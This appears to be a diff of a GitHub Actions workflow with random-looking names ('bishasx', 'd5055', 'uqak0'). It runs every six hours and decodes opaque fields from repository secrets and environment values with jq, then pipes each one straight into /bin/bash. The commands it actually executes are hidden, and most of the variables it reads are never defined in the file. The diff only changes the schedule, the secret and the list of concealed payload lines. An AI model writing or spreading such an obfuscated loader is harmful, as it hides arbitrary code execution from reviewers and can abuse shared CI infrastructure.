@@ -2,7 +2,7 @@ name: bishasx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '32 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: bishasx
         env:
-          ty0: ${{ secrets.ty0 }}
+          d5055: ${{ secrets.d5055 }}
         run: |
-          echo $ty0 | jq -r .yrmpp7110 | /bin/bash
-          echo $vk7586 | jq -r .dw19 | /bin/bash
-          echo $yte50 | jq -r .tam525 | /bin/bash
-          echo $jkjfi0 | jq -r .mgl54063 | /bin/bash
-          echo $mgpi61439 | jq -r .gfz687 | /bin/bash
-          echo $abezn080 | jq -r .z26 | /bin/bash
-          echo $mjwa278 | jq -r .w02 | /bin/bash
-          echo $zrw2839 | jq -r .f049 | /bin/bash
-          echo $hpudn9 | jq -r .mu959 | /bin/bash
-          echo $caw44 | jq -r .xcr04788 | /bin/bash
-          echo $i86 | jq -r .jhs55762 | /bin/bash
-          echo $yfiao218 | jq -r .fwses77 | /bin/bash
-          echo $rlbf4475 | jq -r .k60 | /bin/bash
-          echo $ughi16872 | jq -r .ul88 | /bin/bash
-          echo $mocr10493 | jq -r .ukjx07818 | /bin/bash
-          echo $o59043 | jq -r .i28306 | /bin/bash
-          echo $cp35 | jq -r .gxpnd14676 | /bin/bash
-          echo $rk39690 | jq -r .ub97061 | /bin/bash
+          echo $d5055 | jq -r .uqak0 | /bin/bash
+          echo $dfr9180 | jq -r .gvoz506 | /bin/bash
+          echo $bcp154 | jq -r .s45 | /bin/bash
+          echo $hzsu94 | jq -r .u8481 | /bin/bash
+          echo $paxqk4 | jq -r .zr7443 | /bin/bash
+          echo $nf16661 | jq -r .hj741 | /bin/bash
+          echo $sav49176 | jq -r .oizog8336 | /bin/bash
 
